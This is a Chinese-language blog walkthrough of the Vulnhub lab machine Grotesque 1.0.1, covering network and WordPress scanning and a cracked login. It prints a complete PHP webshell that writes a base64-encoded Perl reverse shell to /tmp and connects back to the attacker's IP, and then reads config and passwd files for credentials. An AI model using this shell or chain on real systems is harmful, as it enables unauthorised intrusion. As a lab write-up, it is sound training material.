<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=author content="VarKai"><title>Grotesque_vh 1.0.1 ｜ 无尽 光芒</title>
<meta name=description content="Vulnhub靶机"><meta name=keywords content="Hugo,Blog,echo"><link rel="shortcut icon" href=https://linksecho.github.io/images/favicon.ico><link rel=stylesheet type=text/css media=screen href=https://linksecho.github.iocss/normalize.css><link rel=stylesheet type=text/css media=screen href=https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css><link rel=stylesheet type=text/css media=screen href=https://linksecho.github.io/css/zozo.css><link rel=stylesheet type=text/css media=screen href=https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css><link rel=stylesheet type=text/css media=screen href=https://linksecho.github.io/css/highlight.css></head><body><div class="main animate__animated animate__fadeInDown"><div class="nav_container animated fadeInDown"><div class=site_nav id=site_nav><ul><li><a href=/>首页</a></li><li><a href=/posts/>归档</a></li><li><a href=/tags/>标签</a></li><li><a href=/about/>关于</a></li></ul></div><div class=menu_icon><a id=menu_icon><i class=ri-menu-line></i></a></div></div><div class="header animated fadeInDown"><div class=site_title_container><div class=site_title><h1><a href=https://linksecho.github.io><span>无尽 光芒</span></a></h1></div><div class=description><p class=sub_title>welcome to echo</p><div class=my_socials><a href=%20 title=facebook target=_blank><i class=ri-facebook-fill></i></a>
<a href=%20 title=github target=_blank><i class=ri-github-fill></i></a>
<a href=%20 title=instagram target=_blank><i class=ri-instagram-fill></i></a>
<a href=%20 title=twitter target=_blank><i class=ri-twitter-fill></i></a>
<a href=%20 title=weibo target=_blank><i class=ri-weibo-fill></i></a>
<a href=https://linksecho.github.io/index.xml type=application/rss+xml title=rss target=_blank><i class=ri-rss-fill></i></a></div></div></div></div><div class=content><div class=post_page><div class="post animate__animated animate__fadeInDown"><div class="post_title post_detail_title"><h2><a href=/posts/grotesque_vh-1.0.1/>Grotesque_vh 1.0.1</a></h2><span class=date>2023.10.06</span></div><div class="post_content markdown"><h3 id=一信息收集>一、信息收集</h3><h4 id=1-使用-arp-scan-找到靶机>1 使用 arp-scan 找到靶机</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>arp-scan --interface eth0 10.9.23.0/24
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>┌──(root㉿kali)-[~]
</span></span><span class=line><span class=cl>└─# arp-scan --interface eth0 10.9.23.0/24
</span></span><span class=line><span class=cl>Interface: eth0, type: EN10MB, MAC: 00:0c:29:0a:50:19, IPv4: 10.9.23.111
</span></span><span class=line><span class=cl>Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
</span></span><span class=line><span class=cl>10.9.23.1       50:6f:77:89:ad:99       HUAWEI TECHNOLOGIES CO.,LTD
</span></span><span class=line><span class=cl>10.9.23.10      68:da:73:a9:5c:57       (Unknown)
</span></span><span class=line><span class=cl>……
</span></span><span class=line><span class=cl>10.9.23.155     08:00:27:9c:83:dc       PCS Systemtechnik GmbH
</span></span><span class=line><span class=cl>……
</span></span><span class=line><span class=cl>10.9.23.233     7c:57:58:67:3c:15       HP Inc.
</span></span><span class=line><span class=cl>10.9.23.235     90:2e:16:a8:b9:1c       LCFC(HeFei) Electronics Technology co., ltd
</span></span><span class=line><span class=cl>10.9.23.238     00:2b:67:39:76:66       LCFC(HeFei) Electronics Technology co., ltd
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>35 packets received by filter, 0 packets dropped by kernel
</span></span><span class=line><span class=cl>Ending arp-scan 1.10.0: 256 hosts scanned in 2.052 seconds (124.76 hosts/sec). 34 responded
</span></span></code></pre></div><p>找到靶机：10.9.23.155 08:00:27:9c:83:dc <strong>PCS Systemtechnik GmbH</strong></p><h4 id=2-使用-nmap-对其进行详细扫描>2 使用 nmap 对其进行详细扫描</h4><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>┌──(root㉿kali)-[~]
</span></span><span class=line><span class=cl>└─# nmap -A -sV -p- 10.9.23.155 
</span></span><span class=line><span class=cl>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-16 19:52 CST
</span></span><span class=line><span class=cl>Nmap scan report for localhost (10.9.23.155)
</span></span><span class=line><span class=cl>Host is up (0.0012s latency).
</span></span><span class=line><span class=cl>Not shown: 65533 closed tcp ports (reset)
</span></span><span class=line><span class=cl>PORT   STATE SERVICE VERSION
</span></span><span class=line><span class=cl>66/tcp open  http    WEBrick httpd 1.4.2 (Ruby 2.5.5 (2019-03-15))
</span></span><span class=line><span class=cl>|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
</span></span><span class=line><span class=cl>|_http-server-header: WEBrick/1.4.2 (Ruby/2.5.5/2019-03-15)
</span></span><span class=line><span class=cl>80/tcp open  http    Apache httpd 2.4.38
</span></span><span class=line><span class=cl>|_http-title: 404 Not Found
</span></span><span class=line><span class=cl>|_http-server-header: Apache/2.4.38 (Debian)
</span></span><span class=line><span class=cl>MAC Address: 08:00:27:9C:83:DC (Oracle VirtualBox virtual NIC)
</span></span><span class=line><span class=cl>Device type: general purpose
</span></span><span class=line><span class=cl>Running: Linux 4.X|5.X
</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
</span></span><span class=line><span class=cl>OS details: Linux 4.15 - 5.8
</span></span><span class=line><span class=cl>Network Distance: 1 hop
</span></span><span class=line><span class=cl>Service Info: Host: 127.0.1.1
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TRACEROUTE
</span></span><span class=line><span class=cl>HOP RTT     ADDRESS
</span></span><span class=line><span class=cl>1   1.23 ms localhost (10.9.23.155)
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap done: 1 IP address (1 host up) scanned in 24.20 seconds
</span></span></code></pre></div><h4 id=3-访问靶机网站>3 访问靶机网站</h4><p>80端口</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116200028.png alt=image.png></p><p>66端口</p><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116200013.png alt=image.png></p><p>最终在66端口下的网页中，我们可以点击<code>here</code>下载到一个压缩包
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116200929.png alt=image.png></p><p>解压后，在<code>\vvmlist\vvmlist.github.io\_vvmlist</code>文件夹中找到一个文件<code>sense.md</code>，在该文件中可以发现有用的信息
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116201121.png alt=image.png></p><p>提示我们可以访问<code>http://10.9.23.155/lyricsblog/</code>
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116201640.png alt=image.png></p><h4 id=4-web扫描>4 web扫描</h4><p>使用dirb、gobuster对<code>http://10.9.23.155:66</code>和<code>http://10.9.23.155/lyricsblog/</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#dirb</span>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# dirb http://10.9.23.155:66
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>DIRB v2.22    
</span></span><span class=line><span class=cl>By The Dark Raver
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>START_TIME: Tue Jan <span class=m>16</span> 20:34:05 <span class=m>2024</span>
</span></span><span class=line><span class=cl>URL_BASE: http://10.9.23.155:66/
</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---- Scanning URL: http://10.9.23.155:66/ ----
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.155:66/assets/                                                                                    
</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://10.9.23.155:66/functions/                                                                                 
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/index <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:1060253<span class=o>)</span>                                                                           
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:1060253<span class=o>)</span>                                                                      
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/LICENSE <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:35149<span class=o>)</span>                                                                             
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.155:66/assets/ ----
</span></span><span class=line><span class=cl><span class=o>(</span>!<span class=o>)</span> WARNING: Directory IS LISTABLE. No need to scan it.                        
</span></span><span class=line><span class=cl>    <span class=o>(</span>Use mode <span class=s1>&#39;-w&#39;</span> <span class=k>if</span> you want to scan it anyway<span class=o>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---- Entering directory: http://10.9.23.155:66/functions/ ----
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/functions/index <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:6442<span class=o>)</span>                                                                    
</span></span><span class=line><span class=cl>+ http://10.9.23.155:66/functions/index.html <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:6442<span class=o>)</span>                
</span></span><span class=line><span class=cl>-----------------
</span></span><span class=line><span class=cl>END_TIME: Tue Jan <span class=m>16</span> 20:38:16 <span class=m>2024</span>
</span></span><span class=line><span class=cl>DOWNLOADED: <span class=m>9224</span> - FOUND: <span class=m>5</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#gobuster</span>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# gobuster dir -u http://10.9.23.155/lyricsblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.txt,.sh   
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.6
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@firefart<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://10.9.23.155/lyricsblog/
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Method:                  GET
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Negative Status codes:   <span class=m>404</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:              gobuster/3.6
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Extensions:              php,html,txt,sh
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:                 <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/.php                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/index.php            <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-content           <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 326<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-content/<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-login.php         <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 5731<span class=o>]</span>
</span></span><span class=line><span class=cl>/license.txt          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 19915<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-includes          <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 327<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-includes/<span class=o>]</span>
</span></span><span class=line><span class=cl>/readme.html          <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 7399<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-trackback.php     <span class=o>(</span>Status: 200<span class=o>)</span> <span class=o>[</span>Size: 135<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-admin             <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 324<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-admin/<span class=o>]</span>
</span></span><span class=line><span class=cl>/xmlrpc.php           <span class=o>(</span>Status: 405<span class=o>)</span> <span class=o>[</span>Size: 42<span class=o>]</span>
</span></span><span class=line><span class=cl>/.html                <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/.php                 <span class=o>(</span>Status: 403<span class=o>)</span> <span class=o>[</span>Size: 276<span class=o>]</span>
</span></span><span class=line><span class=cl>/wp-signup.php        <span class=o>(</span>Status: 302<span class=o>)</span> <span class=o>[</span>Size: 0<span class=o>]</span> <span class=o>[</span>--&gt; http://10.9.23.155/lyricsblog/wp-login.php?action<span class=o>=</span>register<span class=o>]</span>
</span></span><span class=line><span class=cl>Progress: <span class=m>1102800</span> / <span class=m>1102805</span> <span class=o>(</span>100.00%<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=nv>Finished</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span></code></pre></div><p>没有扫描到什么关键有用的信息</p><p>从之前收集的信息可知这是个基于wordpress框架搭建的网站，所以我们可以再用<code>wpscan</code>工具扫一下[[3008-信息收集工具#^abbda8]]</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#基本扫描</span>
</span></span><span class=line><span class=cl>wpscan --url http://10.9.23.155/lyricsblog/
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#漏洞扫描</span>
</span></span><span class=line><span class=cl>wpscan --url http://10.9.23.155/lyricsblog/ --enumerate vp
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>#用户枚举</span>
</span></span><span class=line><span class=cl>wpscan --url http://10.9.23.155/lyricsblog/ --enumerate u
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116202849.png alt=image.png>
发现一个用户<code>erdalkomurcu</code>，接下来我们去找密码</p><h4 id=5-密码破解>5 密码破解</h4><p>最后根据wordpress登录页面的提示
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116212137.png alt=image.png></p><p>在<code>http://10.9.23.155/lyricsblog/</code>网页中找到了，密码为计算下图歌词MD5的值
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116205438.png alt=image.png></p><p>Kali中生成一个文件，将歌词复制进去，再使用md5sum计算MD5的值</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# vim token.txt 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# cat token.txt 
</span></span><span class=line><span class=cl>Çaresiz derdimin sebebi belli
</span></span><span class=line><span class=cl>Dermanı yaramda arama doktor
</span></span><span class=line><span class=cl>Şifa bulmaz gönlüm senin elinden
</span></span><span class=line><span class=cl>Boşuna benimle uğraşma doktor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Aşk yarasıdır bu ilaç kapatmaz
</span></span><span class=line><span class=cl>Derdin teselli beni avutmaz
</span></span><span class=line><span class=cl>Dermanı yardadır sende bulunmaz
</span></span><span class=line><span class=cl>Boşuna benimle uğraşma doktor
</span></span><span class=line><span class=cl>Dokunma benim gönül yarama
</span></span><span class=line><span class=cl>Dokunma doktor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Bedenimde değil kalbimde derdim
</span></span><span class=line><span class=cl>Tek alışkanlığım bir zalim sevdim
</span></span><span class=line><span class=cl>Sen çekil yanımdan sevdiğim gelsin
</span></span><span class=line><span class=cl>Boşuna zamanı harcama doktor
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>┌──<span class=o>(</span>root㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
</span></span><span class=line><span class=cl>└─# md5sum token.txt 
</span></span><span class=line><span class=cl>bc78c6ab38e114d6135409e44f7cdda2  token.txt
</span></span></code></pre></div><p>同时在wordpress登录页<code>http://IP/lyricsblog/wp-login.php</code>的左上角发现密码大写提示
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116212819.png alt=image.png></p><p>使用账号密码登录</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>账号:erdalkomurcu
</span></span><span class=line><span class=cl>密码:BC78C6AB38E114D6135409E44F7CDDA2
</span></span></code></pre></div><p>登录成功
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116213237.png alt=image.png></p><h3 id=二wordpress漏洞利用>二、wordpress漏洞利用</h3><p>根据之前打过的靶机[[2001-Lazysysadmin]]可知，wordpress中存在反弹shell漏洞</p><p>随便找一个PHP页面写入反弹shell
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116222655.png alt=image.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>which</span><span class=p>(</span><span class=nv>$pr</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$path</span> <span class=o>=</span> <span class=nx>execute</span><span class=p>(</span><span class=s2>&#34;which </span><span class=si>$pr</span><span class=s2>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>return</span> <span class=p>(</span><span class=nv>$path</span> <span class=o>?</span> <span class=nv>$path</span> <span class=o>:</span> <span class=nv>$pr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>execute</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nv>$res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$cfe</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=k>if</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=o>@</span><span class=nx>exec</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>,</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=nv>$res</span> <span class=o>=</span> <span class=nx>join</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>,</span><span class=nv>$res</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span> 
</span></span><span class=line><span class=cl>			<span class=k>elseif</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;shell_exec&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>			<span class=nv>$res</span> <span class=o>=</span> <span class=o>@</span><span class=nx>shell_exec</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>);</span>
</span></span><span class=line><span class=cl>			<span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;system&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>system</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=nx>function_exists</span><span class=p>(</span><span class=s1>&#39;passthru&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>passthru</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=o>@</span><span class=nx>ob_get_contents</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>ob_end_clean</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>elseif</span><span class=p>(</span><span class=o>@</span><span class=nx>is_resource</span><span class=p>(</span><span class=nv>$f</span> <span class=o>=</span> <span class=o>@</span><span class=nx>popen</span><span class=p>(</span><span class=nv>$cfe</span><span class=p>,</span><span class=s2>&#34;r&#34;</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=k>while</span><span class=p>(</span><span class=o>!@</span><span class=nx>feof</span><span class=p>(</span><span class=nv>$f</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>.=</span> <span class=o>@</span><span class=nx>fread</span><span class=p>(</span><span class=nv>$f</span><span class=p>,</span><span class=mi>1024</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>pclose</span><span class=p>(</span><span class=nv>$f</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>return</span> <span class=nv>$res</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>cf</span><span class=p>(</span><span class=nv>$fname</span><span class=p>,</span><span class=nv>$text</span><span class=p>){</span>
</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nv>$fp</span><span class=o>=@</span><span class=nx>fopen</span><span class=p>(</span><span class=nv>$fname</span><span class=p>,</span><span class=s1>&#39;w&#39;</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>fputs</span><span class=p>(</span><span class=nv>$fp</span><span class=p>,</span><span class=o>@</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$text</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>fclose</span><span class=p>(</span><span class=nv>$fp</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$yourip</span> <span class=o>=</span> <span class=s2>&#34;10.9.23.111&#34;</span><span class=p>;</span> <span class=c1>#kali的IP地址
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$yourport</span> <span class=o>=</span> <span class=s1>&#39;4444&#39;</span><span class=p>;</span> <span class=c1>#nc监听端口
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$usedb</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;perl&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;perl&#39;</span><span class=p>,</span><span class=s1>&#39;c&#39;</span><span class=o>=&gt;</span><span class=s1>&#39;c&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$back_connect</span><span class=o>=</span><span class=s2>&#34;IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl&#34;</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>cf</span><span class=p>(</span><span class=s1>&#39;/tmp/.bc&#39;</span><span class=p>,</span><span class=nv>$back_connect</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$res</span> <span class=o>=</span> <span class=nx>execute</span><span class=p>(</span><span class=nx>which</span><span class=p>(</span><span class=s1>&#39;perl&#39;</span><span class=p>)</span><span class=o>.</span><span class=s2>&#34; /tmp/.bc </span><span class=si>$yourip</span><span class=s2> </span><span class=si>$yourport</span><span class=s2> &amp;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err> 
</span></span></span></code></pre></div><p>保存后现在kali中使用nc监听端口，然后浏览器访问写入反弹shell的页面</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nc -lvvp <span class=m>4444</span>
</span></span></code></pre></div><p><img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223005.png alt=image.png></p><p>反弹进入后可以使用<code>python -c "import pty;pty.spawn('/bin/bash')"</code> 获取伪终端</p><h3 id=三提权>三、提权</h3><p>进来后，先随便找找文件</p><p>在<code>/var/www/html/lyricsblog/</code>目录下，发现wordpress配置文件<code>wp-config.php</code>中有账号和密码
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223802.png alt=image.png></p><p>使用<code>cat /etc/passwd</code>命令发现包含<code>raphael</code>用户
<img src=https://photo-host.oss-cn-beijing.aliyuncs.com/PicGo/obsidian02/20240116223929.png alt=image.png></p><p>尝试登录<code>raphael</code>用户</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>www-data@grotesque:/var/www/html/lyricsblog$ su raphael
</span></span><span class=line><span class=cl>su raphael
</span></span><span class=line><span class=cl>Password: _double_trouble_
</span></span><span class=line><span class=cl>
